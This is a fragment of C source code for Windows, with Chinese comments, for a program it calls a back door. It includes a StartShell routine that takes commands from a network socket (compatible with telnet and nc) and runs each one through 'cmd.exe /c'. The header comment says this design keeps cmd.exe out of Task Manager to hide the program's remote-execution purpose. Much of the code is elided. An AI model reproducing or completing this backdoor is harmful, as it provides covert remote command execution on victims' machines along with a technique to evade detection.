/**程序说明：
		SDK_BackDoor工程采用双管道处理与cmd程序的数据读写，这样cmd就必须驻留内存
		这里采用单管道处理<back_door.exe /c cmd.exe>加了"/c"去执行cmd，cmd执行完任务
		后就会退出，因此在任务管理器看不到cmd.exe程序，进一步隐藏了该程序的远程执行目的
*/
#include "backDoor.h"
...
BOOL StartShell(UINT uPort){
	...
	//si.hStdInput = hReadPipe;//接收命令行参数，因此，不需要这个管道的读取端
	...
	while (TRUE) {
		...
		if (iRecved > 0 && iRecved != SOCKET_ERROR) {
			_tcscat_s(szCmdBuf, CMD_BUF_LEN, szBuf);//为了兼容telnet和nc瑞士军刀工具
			if (_tcsstr(szCmdBuf, _T("\r\n"))) {
				//Run the command;
				CheckBackKey(szCmdBuf, RECV_BUF_LEN);//检测用户是否输入退格键
